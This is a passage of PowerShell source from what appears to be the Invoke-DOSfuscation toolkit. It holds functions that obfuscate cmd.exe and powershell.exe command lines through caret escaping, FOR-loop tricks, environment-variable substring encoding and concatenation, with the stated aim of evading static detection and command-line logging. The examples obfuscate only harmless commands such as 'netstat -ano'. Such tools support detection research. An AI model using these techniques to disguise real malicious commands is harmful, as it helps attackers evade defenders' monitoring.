                # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                if ($subFind.Replace('^','') -ieq 'findstr')
                {
                    # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                    if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }

                    $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                }
            }

            # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
            if ($DoubleEscape.IsPresent)
            {
                $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
            }

            # Assemble the sub-command that will produce output in cmd.exe that contains "PowerShell".
            $subCommand = "$randomCharA$ftype$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
        }
        'set' {
            Write-Warning "Using SET intricate syntax for PowerShell will produce an incorrect result if launched from PowerShell or PowerShell_ISE since these binaries append an additional path to `$env:PSModule not found when running from other binaries (like cmd.exe)."

            # Randomly choose between set+environment variable name and set+find/findstr syntaxes.
            if (Get-Random -InputObject @(0..1))
            {
                # Randomly select from environment variable values that return specific output containing "PowerShell".
                $setValPSModulePath = Get-Random -InputObject @('PS','PSM','PSMo','PSMod','PSModu','PSModul','PSModule','PSModuleP','PSModulePa','PSModulePat','PSModulePath')
                
                # Set value pairings for retrieving "PowerShell" with set command.
                $valuePairings  = @()
                $valuePairings += @{ EnvVarSubstring = $setValPSModulePath; RequiredDelims = @('s','\'); SearchTerm = 'PowerShell'; Output = 'PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules' }
                
                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from set output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.EnvVarSubstring.Contains('^='))
                        {
                            $valuePairing.EnvVarSubstring = $valuePairing.EnvVarSubstring.Replace('=','^=')
                        }

                        $valuePairing.EnvVarSubstring = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.EnvVarSubstring -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.EnvVarSubstring if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.EnvVarSubstring = $valuePairing.EnvVarSubstring.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "PowerShell".
                $subCommand = "$randomCharA$set$randomCharD$($valuePairing.EnvVarSubstring)$randomSpace4"
            }
            else
            {
                # Randomly select from find/findstr query values that return specific output containing "PowerShell".
                $findValPSModule = Get-Random -InputObject @('PSM','SMo','SMod','Modu','odu','du','dul','ule','leP','ePa','ePat')
            
                # Set value pairings for retrieving "PowerShell" with set+find/findstr command.
                $valuePairings  = @()
                $valuePairings += @{ FindVal = $findValPSModule; RequiredDelims = @('s','\'); SearchTerm = 'PowerShell'; Output = 'PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules' }
            
                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from set output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
                if ($subFind.Replace('^','') -ieq 'find')
                {
                    $randomSpace4 = $randomCharE
                }
                else
                {
                    # Equal characters in the FINDSTR argument need to be escaped with a caret.
                    if ($valuePairing.FindVal.Contains('='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }
                }

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                        {
                            $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                        }

                        $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "PowerShell".
                $subCommand = "$randomCharA$set$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
            }
        }
        default {
            Write-Warning "Undefined `$ObfuscationType ($ObfuscationType) in switch statement."
            
            return $null
        }
    }    

    # Select random token value.
    $randomTokenValue = Get-Random -InputObject $tokenValues

    # Randomly add explicit '+' or '-' sign to positive tokens value if -RandomChar is selected.
    $randomPlusOrMinusSign  = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        if ($randomTokenValue -eq 0)
        {
            $randomPlusOrMinusSign = Get-Random -InputObject @('-','+')
        }
        elseif ($randomTokenValue -gt 0)
        {
            $randomPlusOrMinusSign = '+'
        }
    }

    # Add tokens and delims placeholder value names with randomly-selected values generated in above switch block.
    $tokenValue = "tokens=$randomSpaceA$randomPlusOrMinusSign$randomTokenValue"
    $delimValue = "delims=" + (-join (Get-Random -InputObject $delimValues -Count $delimValues.Count))
    
    # Rejoin above delim and token values with random whitespace in between and encapsulating if -RandomSpace argument is selected.
    $tokenDelimRandomStr = (Get-Random -InputObject @($tokenValue,$delimValue) -Count 2) -join ' '
    if ($RandomSpace.IsPresent)
    {
        # Do not add extra whitespace after $delimValue if it is listed after $tokenValue as this whitespace will then be part of the delim value(s) and cause errors depending on the token value(s).
        if (Get-Random -InputObject @(0..1))
        {
            # Whitespace is not necessary between $tokenValue and $delimValue but the inverse is not true. To maintain more normal appearances default to single space if -RandomSpace argument is not selected.
            if (-not $RandomSpace.IsPresent)
            {
                $randomSpace3 = ' '
            }
            $tokenDelimRandomStr = "$randomSpace1$tokenValue$randomSpace3$delimValue"
        }
        else
        {
            $tokenDelimRandomStr = "$randomSpace1$delimValue$randomSpace2$tokenValue$randomSpace3"
        }
    }

    # Assemble all components into final obfuscated syntax.
    $obfuscatedPowerShell = "$for$randomChar1/$f$randomChar2`"$tokenDelimRandomStr`"$randomChar3%$VarName$randomChar4$in$randomChar5($randomChar6'$subCommand'$randomChar7)$randomChar8$do$randomChar9%$VarName"
    
    # Return final result.
    return $obfuscatedPowerShell
}


function Out-EnvVarEncodedCommand
{
<#
.SYNOPSIS

Out-EnvVarEncodedCommand encodes input string with randomly-selected environment variable substring syntax per character. Everything will be resolved in command line logging, but this technique serves to challenge static and not dynamic detections.

Invoke-DOSfuscation Function: Out-EnvVarEncodedCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Out-ObfuscatedCaret
Optional Dependencies: None

.DESCRIPTION

Out-EnvVarEncodedCommand encodes input string with randomly-selected environment variable substring syntax per character. Everything will be resolved in command line logging, but this technique serves to challenge static and not dynamic detections.

.PARAMETER StringToEncode

Specifies string to encode with environment variable substrings.

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER EnvVarPercent

(Optional) Specifies the percentage of characters to encode with environment variable substrings.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used for all environment variable names (and characters unless -MaintainCase is also selected).

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input between all environment variable index values.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before characters with no escapable meaning.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER DoubleEscape

(Optional) Specifies that obfuscation carets be double escaped to persist obfuscation into child process in certain scenarios.

.PARAMETER MaintainCase

(Optional) Specifies that the casing for the input command be resolved exactly the same in the result, although -RandomCase can still be used to randomize the case of substituted environment variable names.

.EXAMPLE

C:\PS> 'powershell.exe' | Out-EnvVarEncodedCommand

pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll.%SESSIONNAME:~-1,1%%ProgramFiles(x86):~18,1%e

.EXAMPLE

C:\PS> 'powershell.exe' | Out-EnvVarEncodedCommand -ObfuscationLevel 3

%pRogrAMFILes:~    -13,    +1%%prOGraMDATA:~      -9,      +1%%syStEmRooT:~    -7,     -6%%PrOgramFilEs(x86):~   -8,      -7%%usErpROFilE:~   +6,   +1%S^H^E%prOgrAmw6432:~     13,    -2%%TEMP:~   -6,     +1%^.%COmmONPRogRaMW6432:~      +14,      -14%^x^e

.EXAMPLE

C:\PS> Out-EnvVarEncodedCommand -StringToEncode 'echo Encoding With Env Vars Is Fun For Static Detection Evasion But Not For Dynamic Detection Evasion' -EnvVarPercent 25 -RandomCase -RandomSpace -RandomSpaceRange @(1..4) -MaintainCase

ech%APPdAtA:~  -6,    1% E%cOmmONprOgRaMfIles:~    -7,    1%coding With Env V%tmP:~  -7, 1%rs Is Fun %prOgraMFiLES:~    11,  1%or St%loCalaPpDAtA:~  -9,   -8%ti%Tmp:~ -8,    -7%%PrOgrAMFiles:~   10,  1%Det%TMp:~ 5,  1%c%loCAlapPDATa:~  -8, 1%ion Eva%sYSteMrOoT:~  -1,    1%ion But No%proGramDATA:~    -2, -1% F%proGRamfIlEs(x86):~  -17, 1%r %alLusErsPrOfIle:~  -4,    -3%ynamic D%ComMonpRogRamfiLEs:~   14,    1%%ALlUsersProFILe:~    12,  -1%ect%prOgrAMFIlEs:~  -4,    1%o%ComMOnPRogRaMFileS(x86):~    28,  1%%comMoNpROgRaMfIlES:~ -6,    -5%Eva%temp:~   4, 1%i%Temp:~  -9,  -8%n

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>
    
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [System.String]
        $StringToEncode,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $EnvVarPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $DoubleEscape,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $MaintainCase
    )

    # Create "profiles" depending on -ObfuscationLevel value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $EnvVarPercent = Get-Random -InputObject @(10..20)
                $RandomCase    = $false
                $RandomSpace   = $false
                $RandomCaret   = $false
                $DoubleEscape  = $false
            }
            '2' {
                $EnvVarPercent = Get-Random -InputObject @(30..50)
                $RandomCase    = $false
                $RandomSpace   = $false
                $RandomCaret   = $false
                $DoubleEscape  = $false
            }
            '3' {
                $EnvVarPercent    = Get-Random -InputObject @(70..90)
                $RandomCase       = $true
                $RandomSpace      = $true
                $RandomSpaceRange = @(3..6)
                $RandomCaret      = $false
                $DoubleEscape     = $false
            }
        }
    }

    # Set all "reliable" environment variables with their names, start values and end values with drive letters replaced with '*' (which will be substituted in next step below) and usernames removed from variable values.
    # Excluding %ComSpec% because it is already the most-looked-for environment variable in DFIR, but fun fact: %ComSpec% -eq %ComSpec:a=a% -eq %ComSpec:qwerty=% :)
    # If dealing with non-English systems then will also want to exclude certain additional variables (or at least the ValueFront and/or ValueBack values) like those containing "\Users\."
    $envVars  = @()
    $envVars += @{ Name = 'ALLUSERSPROFILE';         ValueFront = '*:\ProgramData';                      ValueBack = '*:\ProgramData' }
    $envVars += @{ Name = 'APPDATA';                 ValueFront = '*:\Users\';                           ValueBack = '\AppData\Roaming' }
    $envVars += @{ Name = 'CommonProgramFiles';      ValueFront = '*:\Program Files\Common Files';       ValueBack = '*:\Program Files\Common Files' }
    $envVars += @{ Name = 'CommonProgramFiles(x86)'; ValueFront = '*:\Program Files (x86)\Common Files'; ValueBack = '*:\Program Files (x86)\Common Files' }
    $envVars += @{ Name = 'CommonProgramW6432';      ValueFront = '*:\Program Files\Common Files';       ValueBack = '*:\Program Files\Common Files' }
    $envVars += @{ Name = 'HOMEPATH';                ValueFront = '\Users\';                             ValueBack = '' }
    $envVars += @{ Name = 'LOCALAPPDATA';            ValueFront = '*:\Users\';                           ValueBack = '\AppData\Local' }
    $envVars += @{ Name = 'OS';                      ValueFront = 'Windows_NT';                          ValueBack = 'Windows_NT' }
    $envVars += @{ Name = 'ProgramData';             ValueFront = '*:\ProgramData';                      ValueBack = '*:\ProgramData' }
    $envVars += @{ Name = 'ProgramFiles';            ValueFront = '*:\Program Files';                    ValueBack = '*:\Program Files' }
    $envVars += @{ Name = 'ProgramFiles(x86)';       ValueFront = '*:\Program Files (x86)';              ValueBack = '*:\Program Files (x86)' }
    $envVars += @{ Name = 'ProgramW6432';            ValueFront = '*:\Program Files';                    ValueBack = '*:\Program Files' }
    $envVars += @{ Name = 'PROMPT';                  ValueFront = '$P$G';                                ValueBack = '$P$G' }
    $envVars += @{ Name = 'PUBLIC';                  ValueFront = '*:\Users\Public';                     ValueBack = '*:\Users\Public' }
    $envVars += @{ Name = 'SystemRoot';              ValueFront = '*:\Windows';                          ValueBack = '*:\Windows' }
    $envVars += @{ Name = 'TEMP';                    ValueFront = '*:\Users\';                           ValueBack = '\AppData\Local\Temp' }
    $envVars += @{ Name = 'TMP';                     ValueFront = '*:\Users\';                           ValueBack = '\AppData\Local\Temp' }
    $envVars += @{ Name = 'USERPROFILE';             ValueFront = '*:\Users\';                           ValueBack = '' }
    $envVars += @{ Name = 'windir';                  ValueFront = '*:\Windows';                          ValueBack = '*:\Windows' }
    
    
    # Randomly select substitution character for '*' values in above $envVars values.
    do
    {
        $charSub = Get-Random -InputObject ([System.Char[]] @(200..300))
    }
    while ([System.Char[]] $StringToEncode | where-object { $_ -eq $charSub })

    # Substitute '*' characters with randomly-selected $charSub in above $envVars values.
    $envVars | foreach-object {
        $_.ValueFront = $_.ValueFront.Replace('*',$charSub)
        $_.ValueBack  = $_.ValueBack.Replace('*',$charSub)
    }
    
    # Convert input $StringToEncode into a character array and iterate over each character for encoding substitution.
    $charsToAssemble = [System.Char[]] $StringToEncode
    $finalResult = $null
    foreach ($char in $charsToAssemble)
    {
        # Convert $char value to String.
        $char = $char.ToString()

        # If -MaintainCase is not selected then convert current character and front/back environment variable values to lower-case strings for case-insensitive usage throughout this function.
        if (-not $MaintainCase.IsPresent)
        {
            $char = $char.ToLower()
            $envVars | foreach-object { $_.ValueFront = $_.ValueFront.ToLower() }
            $envVars | foreach-object { $_.ValueBack  = $_.ValueBack.ToLower()  }
        }

        # Store all matching indexes (positive and negative) in $curCharIndexes array as PSCustomObjects.
        $curCharIndexes  = @()

        # Query all environment variables in $envVars array that contain $char in ValueFront property.
        $frontMatches = $envVars | where-object { $_.ValueFront -cmatch [Regex]::Escape($char) }

        if ($frontMatches)
        {
            # Retrieve random match.
            $randomFront = Get-Random -InputObject $frontMatches

            # Retrieve all positive and negative index values for matching character and store as PSCustomObject in $curCharIndexes.
            $splitIndexMatch = $randomFront.ValueFront.Split($char)

            if ($splitIndexMatch.Count -gt 1)
            {
                $indexPadding = 0
                for ($i = 0; $i -lt ($splitIndexMatch.Count - 1); $i++)
                {
                    # Set positive index value.
                    $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = ($splitIndexMatch[$i].Length + $i + $indexPadding); SecondIndex = 1 }

                    # If the ValueFront and ValueBack properties are the same then also add negative second index syntax as well as negative first index and positive/negative second index.
                    if ($randomFront.ValueFront -eq $randomFront.ValueBack)
                    {
                        $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = ($splitIndexMatch[$i].Length + $i + $indexPadding); SecondIndex = (($randomFront.ValueFront.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding) - 1) * -1) }
                        $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = (($randomFront.ValueFront.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding)) * -1); SecondIndex = 1 }
                        $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = (($randomFront.ValueFront.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding)) * -1); SecondIndex = (($randomFront.ValueFront.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding) - 1) * -1) }
                    }

                    # Increase padding to properly retrieve all matching indexes in $randomMatch.
                    $indexPadding += $splitIndexMatch[$i].Length
                }      
            }
            else
            {
                # Set positive index value.
                $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = $randomFront.ValueFront.IndexOf($char); SecondIndex = 1 }

                # If the ValueFront and ValueBack properties are the same then also add negative second index syntax as well as negative first index and positive/negative second index.
                if ($randomFront.ValueFront -eq $randomFront.ValueBack)
                {
                    $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = $randomFront.ValueFront.IndexOf($char); SecondIndex = (($randomFront.ValueFront.Length - $randomFront.ValueFront.IndexOf($char) - 1) * -1) }
                    $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = (($randomFront.ValueFront.Length - $randomFront.ValueFront.IndexOf($char)) * -1); SecondIndex = 1 }
                    $curCharIndexes += @{ Name = $randomFront.Name; FirstIndex = (($randomFront.ValueFront.Length - $randomFront.ValueFront.IndexOf($char)) * -1); SecondIndex = (($randomFront.ValueFront.Length - $randomFront.ValueFront.IndexOf($char) - 1) * -1) }
                }
            }
        }
        
        # Query all environment variables in $envVars array that contain $char in ValueBack property.
        $backMatches = $envVars | where-object { ($_.ValueBack -cmatch [Regex]::Escape($char)) -and ($_.ValueFront -ne $_.ValueBack) }

        if ($backMatches)
        {
            # Retrieve random match.
            $randomBack = Get-Random -InputObject $backMatches

            # Retrieve all positive and negative index values for matching character and store as PSCustomObject in $curCharIndexes.
            $splitIndexMatch = $randomBack.ValueBack.Split($char)
            
            if ($splitIndexMatch.Count -gt 1)
            {
                $indexPadding = 0
                for ($i = 0; $i -lt ($splitIndexMatch.Count - 1); $i++)
                {
                    # Add negative first index and positive/negative second index.
                    $curCharIndexes += @{ Name = $randomBack.Name; FirstIndex = (($randomBack.ValueBack.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding)) * -1); SecondIndex = 1 }
                    $curCharIndexes += @{ Name = $randomBack.Name; FirstIndex = (($randomBack.ValueBack.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding)) * -1); SecondIndex = (($randomBack.ValueBack.Length - ($splitIndexMatch[$i].Length + $i + $indexPadding) - 1) * -1) }

                    # Increase padding to properly retrieve all matching indexes in $randomMatch.
                    $indexPadding += $splitIndexMatch[$i].Length
                }
            }
            else
            {
                # Add negative first index and positive/negative second index.
                $curCharIndexes += @{ Name = $randomBack.Name; FirstIndex = (($randomBack.ValueBack.Length - $randomBack.ValueBack.IndexOf($char)) * -1); SecondIndex = 1 }
                $curCharIndexes += @{ Name = $randomBack.Name; FirstIndex = (($randomBack.ValueBack.Length - $randomBack.ValueBack.IndexOf($char)) * -1); SecondIndex = (($randomBack.ValueBack.Length - $randomBack.ValueBack.IndexOf($char) - 1) * -1) }
            }
        }

        # Randomly select one index pair from above options for using environment variable syntax at the rate set in $EnvVarPercent. If no matches then return the current plaintext character.
        if ($curCharIndexes -and ((Get-Random -InputObject @(1..100)) -le $EnvVarPercent))
        {
            $envVarIndex = Get-Random -InputObject $curCharIndexes

            # Set random whitespace values if -RandomSpace switch is set.
            $randomSpace1 = ''
            $randomSpace2 = ''
            if ($RandomSpace.IsPresent)
            {
                $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
                $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            }

            # Set random case values if -RandomCase switch is set.
            if ($RandomCase.IsPresent)
            {
                $envVarIndex.Name = Out-RandomCase $envVarIndex.Name
            }

            # Randomly add explicit '+' sign to positive index value option if -RandomCaret (or -DoubleEscape) is selected.
            if (($RandomCaret.IsPresent -or $DoubleEscape.IsPresent) -and ((Get-Random -InputObject @(1..100)) -le $RandomCaretPercent))
            {
                if ($envVarIndex.FirstIndex -eq 0)
                {
                    $envVarIndex.FirstIndex = (Get-Random -InputObject @('+','-')) + $envVarIndex.FirstIndex
                }
                elseif ($envVarIndex.FirstIndex -gt 0)
                {
                    $envVarIndex.FirstIndex = '+' + $envVarIndex.FirstIndex
                }
            }
            if (($RandomCaret.IsPresent -or $DoubleEscape.IsPresent) -and ((Get-Random -InputObject @(1..100)) -le $RandomCaretPercent))
            {
                if ($envVarIndex.SecondIndex -gt 0)
                {
                    $envVarIndex.SecondIndex = '+' + $envVarIndex.SecondIndex
                }
            }

            # Set selected variable name and index values in cmd.exe environment variable syntax for current character, removing second index if value is 0.
            if ($envVarIndex.SecondIndex -eq 0)
            {
                $envSyntax = "%$($envVarIndex.Name):~$randomSpace1$($envVarIndex.FirstIndex)%"
            }
            else
            {
                $envSyntax = "%$($envVarIndex.Name):~$randomSpace1$($envVarIndex.FirstIndex),$randomSpace2$($envVarIndex.SecondIndex)%"
            }

            $finalResult += $envSyntax
        }
        else
        {
            # Add random caret if -RandomCaret or -DoubleEscape switch is set.
            if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
            {
                $char = Out-ObfuscatedCaret -StringToObfuscate $char -RandomCaretPercent:$RandomCaretPercent

                # Double escape caret characters in sub-command components if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $char = $char.Replace('^','^^')
                }

                # Set random case values if -RandomCase switch is set and -MaintainCase is not set.
                if ($RandomCase.IsPresent -and -not $MaintainCase.IsPresent)
                {
                    $char = Out-RandomCase $char
                }
            }

            $finalResult += $char
        }        
    }
    
    # Return obfuscated result.
    return $finalResult
}


function Out-DosConcatenatedCommand
{
<#
.SYNOPSIS

Out-DosConcatenatedCommand obfuscates input cmd.exe and powershell.exe commands via numerous methods supported by cmd.exe including:
    1)  heavy concatenation of command into process-level environment variables
    2)  numerous layers of escaping
    3)  substring replacements for paired double quote escaping
    4)  optional randomized casing
    5)  optional randomized variable names
    6)  optional whitespace obfuscation
    7)  intentionally-placed variable expansion via cmd.exe's CALL and /V:ON switch
    8)  optional comma, semicolon and parentheses obfuscation
    9)  optional intricate syntax for cmd.exe and powershell.exe
    10) cmd.exe's and powershell.exe's ability to execute commands via Standard Input

Invoke-DOSfuscation Function: Out-DosConcatenatedCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Get-RandomVarName, Out-SetVarCommand, Split-Command, Test-ContainsEscapableCharacter, Test-ContainsUnevenDoubleQuote, Remove-Tab, Out-ObfuscatedCaret (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Out-DosConcatenatedCommand obfuscates input cmd.exe and powershell.exe commands via heavy concatenation of layered process-level environment variables.

.PARAMETER Command

Specifies the command to obfuscate with heavy concatenation syntax. This input command can also be obfuscated like: net""stat -""ano | find "127.0.0.1"

.PARAMETER FinalBinary

(Optional) Specifies the obfuscated command should be executed by a child process of powershell.exe, cmd.exe or no unnecessary child process (default). Some command escaping scenarios require at least one child process to avoid errors and will automatically be converted to such necessary syntax.

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters adjusted for -Command length. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER CmdSyntax

(Optional) Specifies the syntax to reference the initial cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER Cmd2Syntax

(Optional) Specifies the syntax to reference the final cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER PowerShellSyntax

(Optional) Specifies the syntax to reference powershell.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER StdIn

(Optional) Specifies that the final command be executed by ECHO'ing it into cmd.exe (or powershell.exe if -PowerShell is specified) to be executed via StdIn. This prevents the arguments from appearing in the final binary's command line arguments.

.PARAMETER DecoyString1

(Optional) Specifies the decoy string to set after the initial cmd.exe and before the /V or /C flags.

.PARAMETER DecoyString2

(Optional) Specifies the decoy string to set after the initial /V flag and before the /C flag.

.PARAMETER VFlag

(Optional) Specifies the decoy string (starting with "V") for the /V:ON flag as long as it is not /V:OFF.

.PARAMETER ConcatenationPercent

(Optional) Specifies the percentage of input Command to concatenate by adjusting the number of substrings.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomFlag

(Optional) Specifies that random flag values be selected wherever possible (e.g. /C and /R interchangeability, environment variable encoding for /C and /V, etc.).

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of eligible characters to insert commas, semicolons and parentheses into if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of eligible characters to insert commas, semicolons and parentheses into if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER VarNameSpecialChar

(Optional) Specifies that variable names to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies that variable names to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosConcatenatedCommand

cmd /C"set hWaZ=-a&&set DVwi= &&set 0oZ=n&&set 1j6u=o&&set Ku=ne&&set bf=stat&&set qu=t&&call set V1=%Ku%%qu%%bf%%DVwi%%hWaZ%%0oZ%%1j6u%&&call %V1%"

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosConcatenatedCommand -ObfuscationLevel 3

